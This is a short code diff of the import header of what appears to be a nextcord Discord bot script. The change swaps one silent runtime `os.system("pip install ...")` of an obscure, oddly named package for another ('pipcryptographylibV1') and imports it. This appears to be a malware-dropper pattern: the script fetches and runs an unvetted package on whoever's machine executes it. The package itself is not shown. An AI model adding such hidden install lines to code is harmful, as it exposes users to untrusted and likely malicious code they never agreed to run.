@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcryptographylibraryV2")
-import pipcryptographylibraryV2
+os.system("pip install pipcryptographylibV1")
+import pipcryptographylibV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
